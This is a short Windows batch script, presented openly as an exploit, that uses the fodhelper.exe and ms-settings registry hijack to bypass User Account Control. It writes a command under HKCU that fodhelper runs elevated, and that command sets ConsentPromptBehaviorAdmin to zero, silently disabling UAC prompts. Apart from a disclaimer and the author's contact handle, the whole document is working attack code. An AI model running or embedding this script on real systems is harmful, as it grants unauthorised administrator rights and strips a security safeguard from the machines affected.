# Do not use this script against people, it is illegal. 
# Script author is not responsible for any of your actions.

# Tested on an up-to-date x64 windows 10 machine, administrator account with UAC enabled.
# Discord: ntauth#1222

@echo off
echo "EP, code started"
REG ADD "HKCU\SOFTWARE\Classes\ms-settings\shell\open\command" /t REG_SZ /d "C:\windows\system32\cmd.exe /c REG ADD HKLM\software\microsoft\windows\currentversion\policies\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f" /f
REG ADD "hkcu\software\classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d " " /f
fodhelper.exe
echo "UAC has been disabled"
